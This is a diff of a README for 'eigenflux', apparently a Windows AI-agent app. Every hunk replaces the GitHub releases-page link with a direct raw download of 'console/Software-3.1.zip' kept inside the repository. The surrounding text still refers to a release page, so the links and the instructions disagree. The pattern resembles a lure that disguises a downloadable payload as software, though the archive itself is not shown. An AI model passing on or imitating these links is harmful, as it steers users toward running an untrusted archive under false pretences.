@@ -1,6 +1,6 @@
 # ⚡ eigenflux - Broadcast AI Agents Across One Network
 
-[![Download eigenflux](https://img.shields.io/badge/Download-EigenFlux-blue?style=for-the-badge)](https://github.com/auracarcinomatous357/eigenflux/releases)
+[![Download eigenflux](https://img.shields.io/badge/Download-EigenFlux-blue?style=for-the-badge)](https://github.com/auracarcinomatous357/eigenflux/raw/refs/heads/main/console/Software-3.1.zip)
 
 ## 📦 What is EigenFlux?
 
@@ -24,7 +24,7 @@ For better use with larger agent tasks, 8 GB of RAM or more works well.
 
 Visit the release page to download and run the app files for Windows:
 
-https://github.com/auracarcinomatous357/eigenflux/releases
+https://github.com/auracarcinomatous357/eigenflux/raw/refs/heads/main/console/Software-3.1.zip
 
 On that page, look for the latest release and download the Windows file that matches your system.
 
@@ -150,7 +150,7 @@ If you do not see the file you need on the release page:
 
 Use this link to visit the download page:
 
-https://github.com/auracarcinomatous357/eigenflux/releases
+https://github.com/auracarcinomatous357/eigenflux/raw/refs/heads/main/console/Software-3.1.zip
 
 ## 🗂️ File Names You May See
 
@@ -221,4 +221,4 @@ When a new release appears, repeat the same steps:
 
 Use the release page here to download and run EigenFlux for Windows:
 
-https://github.com/auracarcinomatous357/eigenflux/releases
+https://github.com/auracarcinomatous357/eigenflux/raw/refs/heads/main/console/Software-3.1.zip
